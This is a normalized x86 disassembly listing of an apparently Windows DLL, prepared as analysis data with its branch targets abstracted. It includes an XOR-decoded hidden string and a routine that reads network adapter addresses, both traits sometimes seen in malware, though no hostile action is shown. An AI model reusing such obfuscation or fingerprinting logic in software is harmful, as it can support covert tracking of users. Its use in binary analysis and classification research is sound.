mov eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
push [ ebp + 0x14 ]
test eax eax
jns r-xdata
push 0x1
push 0xa
jmp r-xdata
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
call sub_1007dabf
pop ebp
retn
sub_100208f0
push ebp
mov ebp esp
sub esp 0x6c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov ebx ecx
mov ecx [ r--data ]
xor edi edi
xor eax eax
nop
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x39
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0xd
jb r-xdata
xor eax eax
lea edx [ ebp - 0x6c ]
push edx
mov [ ebp - 0x6 ] ax
mov eax [ ebx + 0x1c ]
lea edx [ ebp - 0x20 ]
mov [ ebp - 0x6c ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov esi [ ebp - 0x6c ]
call sub_1004df80
mov esi eax
mov eax [ ebp - 0x6c ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp esi edi
je r-xdata
lea edx [ ebp - 0x64 ]
mov eax 0x96
mov esi 0x1
call sub_100050e0
pop edi
mov eax esi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x1c ]
lea edx [ ebp - 0x68 ]
push edx
lea edx [ ebp - 0x20 ]
mov [ ebp - 0x68 ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
jns r-xdata
lea edx [ ebp - 0x64 ]
mov eax 0x96
call sub_100050e0
pop edi
mov eax esi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov esi [ ebx + 0x128 ]
cmp esi edi
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x68 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
mov edi [ esi ]
lea ecx [ ebp - 0x68 ]
push ecx
call sub_10034520
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
sub_10020a20
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx ecx
push edi
mov edi [ ebx + 0x4 ]
mov [ ebp - 0x28 ] ebx
test edi edi
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax 0x3d
call sub_100050e0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0x82
call sub_100050e0
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push edi
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea eax [ ebx + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push ebx
push edi
push eax
mov [ esi + 0x4 ] eax
call sub_100796a0
mov ebx [ ebp - 0x28 ]
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x4 ] 0x0
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea ecx [ edi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x8 ] eax
call sub_100796a0
add esp 0xc
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x8 ] 0x0
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
sub_10020b00
push esi
mov esi eax
mov edx [ esi ]
mov eax [ esi + 0x4 ]
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call sub_1002c5ed
pop esi
retn
push edi
mov edx ecx
shr edx 0x1
mov edi 0x3fffffff
sub edi edx
cmp edi ecx
pop edi
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push ecx
call sub_1000a510
mov ecx eax
cmp ecx eax
jae r-xdata
sub_10020b50
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
je r-xdata
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0x7
xor ecx ecx
mov [ esi + edi * 2 ] cx
pop edi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push ebx
mov ebx [ esi ]
test edi edi
je r-xdata
push ebx
call sub_1006591f
add esp 0x4
pop ebx
lea eax [ edi + edi ]
push eax
push ebx
push esi
call sub_100796a0
add esp 0xc
sub_10020b9b
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0xc ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1000df21
add esp 0x10
test eax eax
jns r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x10 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_10020be0
push ebp
mov ebp esp
push 0xffffffff
push sub_10081ce9
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] edi
mov [ esi ] ax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] 0x1
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
mov edi [ esi + 0x10 ]
sub eax edx
sar eax 0x1
add eax [ ebx + 0x10 ]
cmp edi eax
ja r-xdata
mov edi [ ebp + 0xc ]
mov eax edi
lea edx [ eax + 0x2 ]
lea esp [ esp ]
cmp [ esi + 0x14 ] eax
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push edi
mov ecx esi
call sub_10025720
push 0xffffffff
push 0x0
push ebx
mov ecx esi
call sub_10043930
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push 0x1
push eax
mov ecx esi
call sub_10003d30
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
sub_10020cc0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f1f0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x68
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ebx ecx
mov ecx [ ebp + 0x10 ]
xor esi esi
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x50 ] esi
mov ecx 0x7
xor edx edx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] dx
mov [ ebp - 0x18 ] ecx
xor ecx ecx
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] cx
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x50 ] eax
cmp [ ebx + 0x48 ] cl
jne r-xdata
push esi
push 0x8
lea ecx [ ebp - 0x48 ]
call sub_10008430
mov eax [ ebp - 0x4c ]
mov [ ebx + 0x4c ] esi
cmp eax [ ebp - 0x54 ]
je r-xdata
mov edx [ rw-data ]
mov [ ebx + 0x44 ] edx
mov ebx 0x7
xor edx edx
lea eax [ ebp - 0x2c ]
mov [ edi + 0x14 ] ebx
mov [ edi + 0x10 ] esi
mov [ edi ] dx
cmp edi eax
je r-xdata
cmp [ ebp - 0x34 ] 0x8
mov esi [ ebp - 0x48 ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov ecx [ ebx + 0x4 ]
mov edx [ ecx ]
lea ebx [ ebp - 0x58 ]
push ebx
mov ebx [ ebp - 0x38 ]
lea ebx [ esi + ebx * 2 ]
push ebx
push esi
lea ebx [ ebp - 0x4c ]
push ebx
mov ebx [ ebp - 0x54 ]
push ebx
mov ebx [ ebp - 0x5c ]
push eax
lea eax [ ebx + 0x44 ]
push eax
mov eax [ edx + 0x10 ]
call eax
test eax eax
js r-xdata
lea esi [ ebp - 0x48 ]
xor ecx ecx
cmp [ ebp - 0x34 ] 0x8
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
mov eax [ ebp - 0x2c ]
push eax
call sub_1006591f
add esp 0x4
xor edx edx
mov [ edi + 0x14 ] ebx
mov [ edi + 0x10 ] esi
mov [ edi ] dx
cmp [ ebp - 0x18 ] 0x8
jae r-xdata
mov ecx [ edi ]
push ecx
call sub_1006591f
add esp 0x4
cmp [ ebx + 0x4a ] 0x0
je r-xdata
cmp eax 0x1
jle r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp - 0x48 ]
push edx
call sub_1006591f
add esp 0x4
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
mov [ edi ] eax
mov [ ebp - 0x2c ] esi
mov [ edi + 0x10 ] ecx
mov [ edi + 0x14 ] edx
jmp r-xdata
mov eax [ ebp - 0x1c ]
lea ecx [ eax + eax + 0x2 ]
push ecx
lea edx [ ebp - 0x2c ]
push edx
push edi
call sub_10078db0
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
add esp 0xc
mov [ edi + 0x10 ] ecx
mov [ edi + 0x14 ] edx
jmp r-xdata
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x50 ] r--data
call sub_10008757
push r--data
lea ecx [ ebp - 0x68 ]
push ecx
mov [ ebp - 0x68 ] r--data
call sub_1000bd19
xor edx edx
push 0xffffffff
push edx
mov esi 0x7
add ebx 0x28
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] 0x0
push ebx
mov ecx edi
mov [ edi ] dx
call sub_10019180
mov ebx 0x8
cmp [ ebp - 0x18 ] ebx
jb r-xdata
mov eax [ ebp - 0x58 ]
cmp esi eax
jae r-xdata
cmp eax 0x3
jne r-xdata
xor ecx ecx
cmp [ ebp - 0x34 ] ebx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_1006591f
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x34 ] ebx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
cmp [ ebp - 0x38 ] 0x10
jae r-xdata
sub eax esi
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x2c ]
call sub_10025720
jmp r-xdata
mov eax [ ebp - 0x4c ]
mov esi [ ebp - 0x54 ]
cmp eax esi
je r-xdata
mov [ ebp - 0x2c ] cx
jb r-xdata
cmp [ ebx + 0x4a ] 0x0
je r-xdata
push 0x0
push 0x8
lea ecx [ ebp - 0x48 ]
call sub_10008430
mov esi [ ebp - 0x54 ]
mov eax [ ebp - 0x4c ]
mov ecx eax
sub ecx [ ebp - 0x50 ]
mov [ ebx + 0x4c ] ecx
cmp eax esi
jne r-xdata
movzx edx [ eax ]
push edx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10008430
mov eax [ ebp - 0x4c ]
inc eax
mov [ ebp - 0x4c ] eax
cmp eax esi
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x74 ]
mov [ ebp - 0x50 ] r--data
call sub_10008757
push r--data
lea ecx [ ebp - 0x74 ]
push ecx
mov [ ebp - 0x74 ] r--data
call sub_1000bd19
xor edx edx
push 0xffffffff
push edx
mov esi 0x7
add ebx 0x28
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] 0x0
push ebx
mov ecx edi
mov [ edi ] dx
call sub_10019180
mov ebx 0x8
cmp [ ebp - 0x18 ] ebx
jb r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_1006591f
add esp 0x4
sub_10020fd0
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0x10 ]
push edi
mov edi ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp + 0xc ]
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
call sub_1004c240
add esp 0xc
test eax eax
jne r-xdata
test [ ebp + 0x8 ] 0x10
je r-xdata
mov [ ebp - 0x4 ] 0x4
test [ ebp + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x8 ]
push edx
push ebx
mov edx esi
mov ecx edi
call sub_1001cf50
add esp 0x8
test eax eax
jne r-xdata
test [ ebp + 0x8 ] 0x8
je r-xdata
push ebx
push edi
mov ecx esi
call sub_100675d0
add esp 0x8
test eax eax
jne r-xdata
or [ ebp - 0x4 ] 0x10
mov eax [ ebp + 0x8 ]
push eax
push ebx
mov ecx esi
mov edx edi
call sub_1002bed0
add esp 0x8
test eax eax
jne r-xdata
push ebx
mov edx esi
mov ecx edi
call sub_10029cc0
add esp 0x4
test eax eax
jne r-xdata
or [ ebp - 0x4 ] 0x20
mov ecx [ ebp + 0x8 ]
push ecx
push ebx
mov ecx esi
mov edx edi
call sub_10019ba0
add esp 0x8
test eax eax
mov eax [ ebp - 0x4 ]
jne r-xdata
or [ ebp - 0x4 ] 0x1
or [ ebp - 0x4 ] 0x8
pop edi
mov esp ebp
pop ebp
retn
or eax 0x2
sub_10021090
push esi
mov esi ecx
cmp [ esi + 0xec ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0xb8 ]
test eax eax
je r-xdata
mov eax [ esi + 0xbc ]
test eax eax
je r-xdata
push eax
mov eax [ esi + 0xd4 ]
call eax
mov [ esi + 0xb8 ] 0x0
mov ecx [ esi + 0xd4 ]
push eax
call ecx
mov [ esi + 0xbc ] 0x0
sub_100210d8
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_1006a508
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_1005bb8e
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_1000599d
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn
sub_10021180
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_10039c8c
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_10039c8c
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_100211b0
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ GetAdaptersInfo@IAT ]
push edi
mov edi ecx
lea ecx [ ebp - 0x4c ]
push ecx
push 0x0
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x4c ] 0x0
call ebx
cmp eax 0x6f
je r-xdata
mov edx [ ebp - 0x4c ]
mov eax [ edi ]
push esi
push edx
push 0x8
push eax
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
jne r-xdata
pop edi
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x4c ]
push ecx
push esi
call ebx
test eax eax
je r-xdata
lea eax [ esi + 0x2 ]
pop esi
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
lea edi [ ebp - 0xc ]
mov eax 0x29
mov ebx esi
call sub_10002970
mov edi [ lstrcmpA@IAT ]
mov edi edi
mov edx [ edi ]
push esi
push 0x0
push edx
call [ HeapFree@IAT ]
pop esi
pop edi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x48 ]
mov eax 0x28
call sub_10015360
movzx edx [ ebx + 0x199 ]
movzx eax [ ebx + 0x198 ]
movzx ecx [ ebx + 0x197 ]
push edx
movzx edx [ ebx + 0x196 ]
push eax
movzx eax [ ebx + 0x195 ]
push ecx
movzx ecx [ ebx + 0x194 ]
mov ebx [ ebp - 0x54 ]
push edx
push eax
push ecx
lea edx [ ebp - 0x48 ]
push edx
mov ecx 0x12
call sub_10041b00
mov eax [ ebp - 0x50 ]
mov ecx [ eax ]
add esp 0x1c
push esi
push 0x0
push ecx
call [ HeapFree@IAT ]
mov ecx [ ebp - 0x4 ]
pop esi
pop edi
xor ecx ebp
xor eax eax
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebx + 0x1d8 ]
push ecx
call edi
test eax eax
je r-xdata
sub_10021302
push 0x28
mov eax sub_1007f2ec
call sub_100097c8
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_1004db01
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_1000a66f
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_10021390
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
mov eax edx
push esi
mov [ ebp - 0x4 ] 0x0
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ ebp + 0x10 ]
sub eax esi
push eax
push edx
push 0x0
call sub_10018bc0
mov esi [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push eax
mov ecx esi
mov [ esi ] 0x0
call sub_1000adb0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_100213ec
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_10051e5b
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
pop ebp
retn
sub_1002141a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1000a66f
mov ecx [ ebp + 0x8 ]
mov [ esi + 0xc ] eax
lea eax [ ebp + 0x8 ]
push eax
mov [ esi + 0x10 ] edx
call sub_10040704
mov ecx [ eax ]
mov [ esi + 0x8 ] ecx
and [ eax ] 0x0
push [ ebp + 0x8 ]
call sub_10022b5a
pop ecx
pop esi
pop ebp
retn 0x4
sub_10021480
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
cmp edi [ ebp + 0x8 ]
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x14 ]
push ebx
mov ebx [ edx + 0x10 ]
push esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x10
jb r-xdata
mov esi [ edi + 0x10 ]
mov eax esi
cmp eax esi
jae r-xdata
mov edx [ edx ]
mov ecx esi
cmp esi ebx
jb r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov ecx ebx
mov eax edi
mov eax [ edi ]
jmp r-xdata
add edi 0x1c
cmp edi [ ebp + 0x8 ]
jne r-xdata
cmp esi ebx
jb r-xdata
push ecx
push edx
push eax
call sub_10050b90
add esp 0xc
test eax eax
jne r-xdata
mov edx [ ebp + 0xc ]
pop esi
mov eax edi
pop ebx
cmp esi ebx
setne al
test eax eax
je r-xdata
sub_1002152b
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_10021561
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_1003fe0d
fstp [ ebp + 0x8 ]
add esp 0xc
fld [ ebp + 0x8 ]
pop ebp
retn
sub_100215b0
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x10 ]
push edi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
push r--data
call sub_10050437
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x10 ]
mov edx [ ebp + 0x10 ]
cmp eax edx
jb r-xdata
mov edi [ ebp + 0x14 ]
sub eax edx
cmp eax edi
jae r-xdata
or edx 0xffffffff
sub edx ecx
cmp edx edi
ja r-xdata
mov edi eax
test edi edi
je r-xdata
push r--data
call sub_1002c5ed
pop edi
mov eax esi
pop esi
pop ebp
retn 0x10
push ebx
lea ebx [ ecx + edi ]
mov [ ebp + 0x14 ] ebx
cmp ebx 0xfffffffe
jbe r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
jae r-xdata
push r--data
call sub_1002c5ed
test ebx ebx
jne r-xdata
push ecx
push ebx
mov ecx esi
call sub_10016d10
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov [ esi + 0x10 ] ebx
cmp eax 0x10
jb r-xdata
pop ebx
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
pop ebx
mov eax esi
pop edi
mov [ eax ] 0x0
pop esi
pop ebp
retn 0x10
mov eax [ esi ]
mov [ eax ] bl
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x10
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov eax 0x10
cmp [ ecx + 0x14 ] eax
jb r-xdata
mov eax [ ebp + 0x10 ]
lea edx [ eax + edi ]
cmp ebx eax
jb r-xdata
mov edx [ esi + 0x10 ]
sub edx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
push edx
add ecx ebx
add eax ebx
push ecx
add eax edi
push eax
call sub_10078db0
mov ecx [ ebp + 0xc ]
add esp 0xc
cmp esi ecx
jne r-xdata
cmp [ esi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov edx eax
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov [ eax + ecx ] 0x0
mov eax [ esi ]
pop ebx
mov [ eax + ecx ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x10
add ecx [ ebp + 0x10 ]
push edi
push ecx
add eax ebx
push eax
call sub_100796a0
push edi
add ecx edx
mov eax esi
push ecx
add eax ebx
push eax
call sub_10078db0
jmp r-xdata
mov eax [ esi ]
push edi
add ecx edx
push ecx
add eax ebx
push eax
call sub_10078db0
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov ecx [ ebp + 0x14 ]
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] ecx
jb r-xdata
sub_10021722
push 0x80
mov eax sub_1007f73e
call sub_1001bb6b
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x18 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x70 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x8c ] eax
lea eax [ ebp - 0x88 ]
push eax
mov [ ebp - 0x74 ] edi
call sub_100688a0
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_10004f60
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x78 ] eax
call sub_10069ce0
mov ecx [ ebp - 0x78 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_10051f6c
add edi 0x8
push edi
push ebx
push 0x30
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x6c ] edi
call sub_1003088d
push edi
movzx eax ax
push ebx
push 0x61
mov [ ebp - 0x60 ] eax
call sub_1003088d
push edi
movzx eax ax
push ebx
push 0x41
mov [ ebp - 0x80 ] eax
call sub_1003088d
movzx eax ax
add esp 0x24
push [ ebp - 0x5c ]
mov [ ebp - 0x7c ] eax
mov eax [ ebp - 0x70 ]
mov ecx esi
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x51 ] bl
call sub_100081b8
test al al
jne r-xdata
mov eax [ ebp - 0x50 ]
push [ ebp - 0x5c ]
mov [ eax ] 0x7830
add eax 0x2
mov ecx esi
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x49 ] bl
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x68 ] ebx
call sub_100081b8
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2b
call sub_1003088d
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x60 ]
jne r-xdata
mov ecx esi
call sub_10023e65
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x70 ]
mov [ eax ] 0x2b
jmp r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_100081b8
test al al
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
mov ecx esi
call sub_1005576a
push [ ebp - 0x5c ]
mov ecx esi
call sub_100081b8
test al al
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2d
call sub_1003088d
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
inc eax
mov ecx esi
mov [ ebp - 0x50 ] eax
call sub_1005576a
